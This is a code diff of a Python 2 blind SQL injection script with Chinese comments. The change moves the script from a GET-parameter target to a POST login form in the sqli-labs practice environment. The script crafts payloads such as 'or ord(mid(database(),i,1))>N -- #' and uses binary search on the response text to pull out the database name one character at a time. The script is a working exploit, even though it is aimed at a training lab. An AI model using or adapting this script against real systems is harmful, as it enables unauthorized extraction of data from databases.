@@ -7,15 +7,16 @@ import string
 #脚本应用于get请求单框注入情况下
 #定义一个url
 #url='http://ctf5.shiyanbar.com/423/web/?id='; #简单sql注入1
-url='http://localhost/sqli-labs/Less-5/?id=' #简单sql注入2
+url='http://localhost/sqli-labs/Less-14/?id=' #简单sql注入2
 #定义语法关键字测试使用的载荷库
 #payload1_attack = "1%27%20and%20ord(mid(version(),"# 通过ord(mid(version))函数逐字爆破版本名
-payload1_attack = "1%27%20and%20ord(mid(database(),"# 通过ord(mid(database))函数逐字爆破数据库名
+payload1_attack = '1"'+" or ord(mid(database(),"# 通过ord(mid(database))函数逐字爆破数据库名
 #-------------------------------------------------------------------------------------------------#
 f = file("result.txt", "w+")
 # 定义攻击载荷
-keyword='You are in'
-payload2="'%20--+" #终止SQL语句注释符号
+keyword='flag.jpg'
+payload_end=' -- #/*'
+password='*/-- #'
 versionlen=0
 stop=False
 wList=[]
@@ -25,7 +26,7 @@ for num in range(0,128):
     # print str(num)
     wList.append(str(num))
 for i in range(1,20):
-    payload1=payload1_attack+str(i)+",1))>'"
+    payload1=payload1_attack+str(i)+",1))>"
     # payload1=payload1_database+ str(i) + ",1))>'"
     lo=0
     hi=len(wList)-1
@@ -35,12 +36,15 @@ for i in range(1,20):
             # print 'lo='+str(lo)
             # print 'hi=' + str(hi)
             mid = (lo + hi) / 2
-            payload = payload1 + wList[mid] + payload2
+            payload = payload1 + wList[mid] + payload_end
             # print url + payload
-            req = urllib2.Request(url + payload)
-            # print 'req is already: ' + url + quote("1' " + line + " '1'='1")
-            res = urllib2.urlopen(req, data=None, timeout=1)
-            # print 'res is already '
+            postdata = dict(uname=payload, passwd=password, submit='Submit')
+            # url编码
+            postdata = urllib.urlencode(postdata)
+            print postdata
+            # enable cookie
+            req = urllib2.Request(url, postdata)
+            res = urllib2.urlopen(req, data=None, timeout=2)
             text = res.read()
             if (text.find(keyword) > -1):
                 if(hi==lo or (hi-lo)==1):
